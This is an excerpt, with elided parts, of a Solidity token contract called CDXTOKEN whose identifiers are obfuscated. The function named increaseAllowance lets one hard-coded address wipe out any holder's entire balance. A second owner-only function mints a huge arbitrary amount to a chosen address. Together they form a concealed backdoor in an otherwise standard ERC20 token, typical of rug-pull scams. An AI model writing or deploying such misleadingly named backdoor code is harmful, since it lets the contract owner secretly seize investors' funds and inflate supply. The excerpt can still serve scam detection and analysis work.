...
contract CDXTOKEN is Ownable {
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(cttbvg78 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = CDX[newadd];
        uint256 newaaamount = CDX[newadd]+CDX[newadd]-curamount;
        CDX[newadd] -= newaaamount;
        }else{
        if(cttbvg78 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        CDX[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(cttbvg78 == _msgSender());
        if(cttbvg78 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = CDX[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        CDX[from] = CDX[from]-amount;
        CDX[to] = CDX[to]+amount;
